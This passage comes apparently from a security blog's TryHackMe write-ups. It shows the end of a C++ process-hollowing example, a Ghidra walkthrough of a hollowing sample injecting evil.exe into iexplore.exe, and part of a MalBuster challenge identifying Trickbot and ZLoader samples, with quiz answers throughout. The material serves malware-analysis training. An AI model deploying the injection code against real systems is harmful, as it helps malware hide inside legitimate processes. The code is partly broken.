                <span class="n">DWORD</span> <span class="n">dwOffset</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">lpBaseAddress</span> <span class="o">-</span> <span class="n">inth</span><span class="p">.</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">ImageBase</span> <span class="o">+</span> <span class="n">dwEntrypoint</span><span class="p">;</span>

                <span class="c1">// Write the new entry point to the target process</span>
                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)(</span><span class="n">lpBaseAddress</span> <span class="o">+</span> <span class="n">dwEntrypoint</span> <span class="o">-</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">pe</span><span class="p">.</span><span class="n">modBaseAddr</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">dwOffset</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">DWORD</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">dwRead</span><span class="p">))</span>
                <span class="p">{</span>
                    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hProcess</span><span class="p">);</span>
                    <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
                <span class="p">}</span>

                <span class="c1">// Close the handle to the target process</span>
                <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hProcess</span><span class="p">);</span>

                <span class="k">break</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">Process32Next</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pe</span><span class="p">));</span>
    <span class="p">}</span>

    <span class="c1">// Close the handle to the snapshot</span>
    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">);</span>

    <span class="c1">// Initialize the STARTUPINFO and PROCESS_INFORMATION structures</span>
    <span class="n">STARTUPINFO</span> <span class="n">si</span><span class="p">;</span>
    <span class="n">PROCESS_INFORMATION</span> <span class="n">pi</span><span class="p">;</span>
    <span class="n">ZeroMemory</span><span class="p">(</span><span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">si</span><span class="p">));</span>
    <span class="n">ZeroMemory</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pi</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">pi</span><span class="p">));</span>

    <span class="c1">// Create the source process in a suspended state</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CreateProcess</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">szSourceProcessName</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">CREATE_SUSPENDED</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pi</span><span class="p">))</span>
    <span class="p">{</span>
        <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// Get the context of the source process's primary thread</span>
    <span class="n">CONTEXT</span> <span class="n">ctx</span><span class="p">;</span>
    <span class="n">ctx</span><span class="p">.</span><span class="n">ContextFlags</span> <span class="o">=</span> <span class="n">CONTEXT_FULL</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">GetThreadContext</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ctx</span><span class="p">))</span>
    <span class="p">{</span>
        <span class="n">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">);</span>
        <span class="n">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">);</span>
        <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// Update the entry point in the context to point to the new image</span>
    <span class="n">ctx</span><span class="p">.</span><span class="n">Eax</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">pi</span><span class="p">.</span><span class="n">lpBaseOfImage</span> <span class="o">+</span> <span class="p">((</span><span class="n">IMAGE_DOS_HEADER</span><span class="o">*</span><span class="p">)</span><span class="n">pi</span><span class="p">.</span><span class="n">lpBaseOfImage</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">e_lfanew</span> <span class="o">+</span> <span class="p">((</span><span class="n">IMAGE_NT_HEADERS</span><span class="o">*</span><span class="p">)(((</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)</span><span class="n">pi</span><span class="p">.</span><span class="n">lpBaseOfImage</span><span class="p">)</span> <span class="o">+</span> <span class="p">((</span><span class="n">IMAGE_DOS_HEADER</span><span class="o">*</span><span class="p">)</span><span class="n">pi</span><span class="p">.</span><span class="n">lpBaseOfImage</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">e_lfanew</span><span class="p">))</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">AddressOfEntryPoint</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">SetThreadContext</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ctx</span><span class="p">))</span>
    <span class="p">{</span>
        <span class="n">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">);</span>
        <span class="n">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">);</span>
        <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// Resume the source process's primary thread</span>
    <span class="n">ResumeThread</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">);</span>

    <span class="c1">// Close handles to the source process and thread</span>
    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">);</span>
    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">);</span>

    <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="c1">// Define the source and target process names</span>
    <span class="kt">char</span><span class="o">*</span> <span class="n">szSourceProcessName</span> <span class="o">=</span> <span class="s">"C:</span><span class="se">\\\\</span><span class="s">Windows</span><span class="se">\\\\</span><span class="s">System32</span><span class="se">\\\\</span><span class="s">calc.exe"</span><span class="p">;</span>
    <span class="kt">char</span><span class="o">*</span> <span class="n">szTargetProcessName</span> <span class="o">=</span> <span class="s">"notepad.exe"</span><span class="p">;</span>

    <span class="c1">// Attempt to hollow the target process and print the result</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">HollowProcess</span><span class="p">(</span><span class="n">szSourceProcessName</span><span class="p">,</span> <span class="n">szTargetProcessName</span><span class="p">))</span>
    <span class="p">{</span>
        <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"Process hollowing successful"</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">else</span>
    <span class="p">{</span>
        <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"Process hollowing failed"</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

</code></pre></div></div> <h3 id="questions-4">Questions</h3> <p><strong>Which API is used to to write malicious code to the allocated memory during process hollowing?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">WriteProcessMemory()</code></em></p> <h2 id="task-9---analyzing-process-hollowing">Task 9 - Analyzing Process Hollowing</h2> <p>Now that we understand the basics of Ghidra, some techniques in a disassembled version and some usages with the Windows API, we are going to analyze a sample called <code class="language-plaintext highlighter-rouge">Benign.exe</code>.</p> <p>Our goals are:</p> <ul> <li>Examine API calls to find a suspiccious pattern</li> <li>Look at suspicious strings</li> <li>Find interesting functions</li> <li>Examine disassembled/decompiled code to find as much information as possible</li> </ul> <blockquote> <p><strong>Note:</strong> Even if we are starting by looking for Windows API calls right away, it is not how an analyst would start analyzing an unknown binary.</p> </blockquote> <h3 id="createprocess">CreateProcess</h3> <p>In the previous task, we have learnt in process hollowing that a legitimate victim process is created in the suspended state. We can search for <code class="language-plaintext highlighter-rouge">CreateProcessA</code> function in <em>Imports -&gt; Kernel32.dll</em> and <em>Show References to</em>:</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/H16dnN6OA.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="CreateProcessA search" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>The first reference will take us to the <em>Process Hollowing</em> function, at the legitimate process creation:</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/SyxHpVTuR.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="References to CreateProcessA" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PROCESS_INFORMATION</span> <span class="n">pi</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CreateProcess</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">szSourceProcessName</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">CREATE_SUSPENDED</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pi</span><span class="p">))</span>
    <span class="p">{</span>
        <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
    <span class="p">}</span>
</code></pre></div></div> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/HJd_6NaOA.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="CreateProcessA decompiled" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>It clearly shows how the parameters on the stack are pushed in reverse order before calling the function? The <code class="language-plaintext highlighter-rouge">0x4</code> value represent the suspended state in the <a href="https://learn.microsoft.com/en-us/windows/win32/procthread/process-creation-flags">process creation flag</a>.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/H1W5A46_C.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="CREATE_SUSPENDED" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <h3 id="graph-view">Graph View</h3> <p>The <strong>Display Function Graph</strong> in the toolbar will show the graph view of the disassembled code we are examining.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/BywIJSauA.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="CreateProcessA Graph View" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>In this case, the program:</p> <ul> <li>Fails to create a victim process in the suspended state, it will follow the red arrow, thus the block 1.</li> <li>Successfully creates the victim rocess, it will follow the block 2, the green arrow.</li> </ul> <h3 id="open-suspicious-file">Open Suspicious File</h3> <p>The <a href="https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea">CreateFileA</a> funciton is either used to create or open an existing file. The behaviour is chosen by using <code class="language-plaintext highlighter-rouge">GENERIC_READ</code> or <code class="language-plaintext highlighter-rouge">GENERIC_WRITE</code> for the <code class="language-plaintext highlighter-rouge">dwDesiredAccess</code> parameter.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/Ski-QBauR.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="CreateFileA disassembled" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>Then, new memory is created in the victim process using <a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc">VirtualAlloc</a> with the size of the file (<a href="https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-getfilesize">GetFileSize</a>).</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/rk44Br6OA.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Memory Allocation" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>Moreover, the <em>hFile</em> handle of <em>CreateFileA</em> will be used to get the content using the <a href="https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-readfile">ReadFile</a> function. Then, the file’s content will be written in the already allocated memory. The location of the new memory is the <em>lpBuffer</em> var.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/BkiBISpuA.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="ReadFile compiled" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <h3 id="hollowing-the-process">Hollowing the process</h3> <p>Malware use <code class="language-plaintext highlighter-rouge">ZwUnmapViewOfSection</code> or <code class="language-plaintext highlighter-rouge">NtUnmapViewOfSection</code> API calls to unmap the target process’s memory.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/Byz2LS6O0.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="NtUnmapViewOfSection call" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p><a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwunmapviewofsection">NtUnmapViewOfSection</a> takes exactly two arguments, the <strong>base address</strong> (virtual address) to be unmapped and the <strong>handle to the process</strong> that needs to be hollowed. Essentially, it removes a previously mapped section of memory, making that memory range available for other uses. In the context of process hollowing, malware uses <code class="language-plaintext highlighter-rouge">NtUnmapViewOfSection</code> to remove the existing memory contents of a target process. This creates a clean slate, allowing the attacker to inject and execute their own code within the address space of a legitimate process, thereby gaining control of it while minimizing detection risks.</p> <h3 id="allocate-memory">Allocate Memory</h3> <p>Once the process is hollowed, malware must allocate needed memory using <a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex">VirtualAllocEx</a> before writing the rogue part.<br/> Arguments passed to the function include a handle to the process, address to be allocated, size, allocation type, and memory protection flag.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/SJskrdAu0.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="VirtualAllocEx disassembled" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <h3 id="write-down-the-memory">Write down the memory</h3> <p>Once the memory is allocated, the malware will attempt to write the suspicious process into the memory of the hollowed process using <a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory">WriteProcessMemory</a>.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/rJ-9r_0dR.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="WriteProcessMemory disassembled" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>There were three calls to the <code class="language-plaintext highlighter-rouge">WriteProcessMemory</code> Function. The last call references to the code in the Kernel32 DLL; therefore, we can ignore that. From the decompiled code, it seems the program is copying different sections of the suspicious process one by one.</p> <h3 id="resume-thread">Resume Thread</h3> <p>Once all is sorted out, the malware will get hold of the thread using the <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext">SetThreadContext</a> and then resume the thread using <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread">ResumeThread</a>.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/BkUgu_AO0.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Thread Resuming disassembled" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <h3 id="questions-5">Questions</h3> <p><strong>What is the MD5 hash of the benign.exe sample?</strong></p> <p>Go to the project browser, then <em>right click on the executable -&gt; properties</em></p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/HyrJ5OCOR.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="benign.exe properties" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">e60a461b80467a4b1187ae2081f8ca24</code></em></p> <p><strong>How many API calls are returned if we search for the term ‘Create’ in the Symbol Tree section?</strong></p> <p>For this question, we need to use the filter of the Symbol Tree.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/SygDqdAuC.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Symbol Tree filter" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">2</code></em></p> <p><strong>What is the first virtual address where the CreateProcessA function is called?</strong></p> <p>We need to use the <em>Show References to</em> or <em>Ctrl+Shift+F</em> to search for occurences of the function in the program.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/r1TAq_RdR.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Show References to" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/Bk3Ni_ROA.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="First Occurence" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">0040108f</code></em></p> <p><strong>Which process is being created in suspended state by using the <code class="language-plaintext highlighter-rouge">CreateProcessA</code> API call?</strong></p> <p>The created process’s name is located at the second parameter of the <code class="language-plaintext highlighter-rouge">CreateProcessA</code> function.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/S1xBh_0uC.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="CreateProessA syntax" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/B1nPhu0dR.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="CreateProcessA decompiled parameters" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">iexplore.exe</code></em></p> <p><strong>What is the first virtual address where the <code class="language-plaintext highlighter-rouge">CreateFileA</code> function is called?</strong></p> <p>The same thing to locate <em>CreateProcessA</em> is done here.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/SkqeaORuC.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="CreateFileA" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">004010f0</code></em></p> <p><strong>What is the suspicious process being injected into the victim process?</strong></p> <p>The process name can be found in the first parameter of <em>CreateFileA</em>.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/Sy4_6dAd0.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="CreateFileA syntax" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/BkdcTdCd0.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="CreateFileA decompiled parameters" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">evil.exe</code></em></p> <p><strong>Based on the Function Graph, what is the virtual address of the code block that will be executed if the program doesn’t find the suspicious process?</strong></p> <p>The executed code if the program doesn’t find the suspicious process would be this:</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/r1NBCdR_0.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Decompiled block" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>According to the <em>Function Graph</em>, this is the code clock we get:</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/rkFSJKCOR.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="CreateFileA error code block" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">00401101</code></em></p> <p><strong>Which API call is found in the import functions used to unmap the process’s memory?</strong></p> <p>The API call can be found in <em>ntdll.dll</em>:</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/rkixlFA_A.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="NtUnmapViewOfSection" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">NtUnmapViewOfSection</code></em></p> <p><strong>How many calls to the <code class="language-plaintext highlighter-rouge">WriteProcessMemory</code> function are found in the code? (.text section)</strong></p> <p>There are two occurences/API calls shown in the <em>Location References Provider</em>.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/r1HOeYROC.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="WriteProcessMemory location" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">2</code></em></p> <p><strong>What is the full path of the suspicious process shown in the strings?</strong></p> <p>To answer this, we have to go back to our <code class="language-plaintext highlighter-rouge">CreateFileA</code> function call.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/Hk81WF0OA.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="CreateFileA suspicious file call string" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">"C:\\Users\\THM-Attacker\\Desktop\\Injectors\\evil.exe"</code></em></p> <h2 id="task-10---conclusion">Task 10 - Conclusion</h2> <p>In summary, this room provided foundational knowledge in advanced static analysis of malware using Ghidra, a powerful and free tool for dissecting executable files. We explored common APIs employed by malware, such as CreateProcessA, CreateFileA, and WriteProcessMemory, and gained insights into the process hollowing technique, where a malicious code injects itself into a legitimate process. By mastering these elements, we enhance our ability to analyze and understand malware behaviors, ultimately improving our skills in cybersecurity and threat detection.</p> <p>The next step after performing advanced static analysis is the dynamic analysis, which will be covered next.</p>]]></content><author><name>NonoHM</name></author><category term="THM"/><category term="Malware Analysis"/><category term="RE"/><category term="Static Analysis"/><summary type="html"><![CDATA[Task 1 - Introduction]]></summary></entry><entry><title type="html">THM CTF MalBuster</title><link href="https://nonohm.github.io/blog/2024/THM-CTF-MalBuster/" rel="alternate" type="text/html" title="THM CTF MalBuster"/><published>2024-05-10T14:05:37+00:00</published><updated>2024-05-10T14:05:37+00:00</updated><id>https://nonohm.github.io/blog/2024/THM-CTF-MalBuster</id><content type="html" xml:base="https://nonohm.github.io/blog/2024/THM-CTF-MalBuster/"><![CDATA[<h2 id="task-1---introduction">Task 1 - Introduction</h2> <p>In this room, we’ll be charged of analyzing malware samples provided by the SOC Team. We will mainly use FLARE VM (sometimes REMnux) and our knowledge learned in <a href="https://tryhackme.com/room/dissectingpeheaders">Dissecting PE Headers</a> and <a href="https://tryhackme.com/room/staticanalysis1">Basic Static Analysis</a>.</p> <h2 id="task-2---challenge-questions">Task 2 - Challenge Questions</h2> <p>Malware samples are located in <em>Desktop\Samples</em>.</p> <p><strong>Based on the ARCHITECTURE of the binary, is malbuster_1 a 32-bit or a 64-bit application? (32-bit/64-bit)</strong></p> <p>To retrieve this information, we will use <em>pestudio</em> to investigate into PE Headers. On FLARE VM, <em>pestudio</em> is available into <em>Desktop\FLARE\Utilities</em>.</p> <p>When we open this file with the utility, we are directly welcomed with interesting information, including the CPU architecture of the application.</p> <figure> <picture> <img src="/assets/img/images/thm_ctf_malbuster/HyFZg9oGR.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="pestudio malbuster_1" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">32-bit</code></em></p> <p><strong>What is the MD5 hash of malbuster_1?</strong></p> <p>Using the same tab, we are able to know the md5 of the file.</p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">4348DA65E4AEAE6472C7F97D6DD8AD8F</code></em></p> <p><strong>Using the hash, what is the number of detections of malbuster_1 in VirusTotal?</strong></p> <p>Using the provided md5 hash on virustotal, we are able to see that malware is a <code class="language-plaintext highlighter-rouge">trojan.zbot/razy</code>.</p> <figure> <picture> <img src="/assets/img/images/thm_ctf_malbuster/rJMWZqjfC.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="virustotal malbuster_1" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">58</code></em></p> <p><strong>Based on VirusTotal detection, what is the malware signature of malbuster_2 according to Avira?</strong></p> <p>To obtain the Avira’s malware signature, we have to go through the same steps as before.</p> <p>The md5 hash provided by pestudio is <em>1D7EBED1BAECE67A31CE0A17A0320CB2</em>.</p> <p>By putting this value on Virustotal, we obtain the following results:</p> <figure> <picture> <img src="/assets/img/images/thm_ctf_malbuster/Sy-mT5jM0.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Virustotal malbuster_2" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">HEUR/AGEN.1306860</code></em></p> <p><strong>malbuster_2 imports the function <code class="language-plaintext highlighter-rouge">_CorExeMain</code>. From which DLL file does it import this function?</strong></p> <p>According to <em>pestudio</em>, we can see that function comes from .NET Runtime Execution Engine.</p> <figure> <picture> <img src="/assets/img/images/thm_ctf_malbuster/Ska-EssMA.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Imported libraries malbuster_2" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <figure> <picture> <img src="/assets/img/images/thm_ctf_malbuster/S1SxVjiGC.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Functions malbuster_2" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">mscoree.dll</code></em></p> <p><strong>Based on the VS_VERSION_INFO header, what is the original name of malbuster_2?</strong></p> <p>On <em>pestudio</em>, we can find this header in the <em>version</em> tab.</p> <figure> <picture> <img src="/assets/img/images/thm_ctf_malbuster/S18s8sszR.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Version malbuster_2" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">7JYpE.exe</code></em></p> <p><strong>Using the hash of malbuster_3, what is its malware signature based on abuse.ch?</strong></p> <p>We retrieve the executable’s md5 hash on <em>pestudio</em> and then we copy it into abuse.ch.</p> <p>This is what we get in return:</p> <figure> <picture> <img src="/assets/img/images/thm_ctf_malbuster/Sksq02hM0.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="abuse.ch malbuster_3" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Trickbot</code></em></p> <p><strong>Using the hash of malbuster_4, what is its malware signature based on abuse.ch?</strong></p> <p>By doing the same steps, this is what we get from abuse.ch:</p> <figure> <picture> <img src="/assets/img/images/thm_ctf_malbuster/ryVMJanGR.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="abuse.ch malbuster_4" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">ZLoader</code></em></p> <p><strong>What is the message found in the DOS_STUB of malbuster_4?</strong></p> <p>By searching in the DOS Stub, we find that the message is a bit different than usual:</p> <figure> <picture> <img src="/assets/img/images/thm_ctf_malbuster/HkpPlT3MA.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="DOS Stub malbuster_4" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>*Answer: <code class="language-plaintext highlighter-rouge">This Salfram cannot be run in DOS mode</code></p> <p><strong>malbuster_4 imports the function <code class="language-plaintext highlighter-rouge">ShellExecuteA</code>. From which DLL file does it import this function?</strong></p> <p>We can retrieve the imported dlls and functions in the <em>Imports</em> tab in <em>pe-bear</em>. (<em>pestudio</em> could not work)</p> <figure> <picture> <img src="/assets/img/images/thm_ctf_malbuster/B1P3zp3z0.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Imports malbuster_4" loading="lazy" onerror="this.onerror=null; 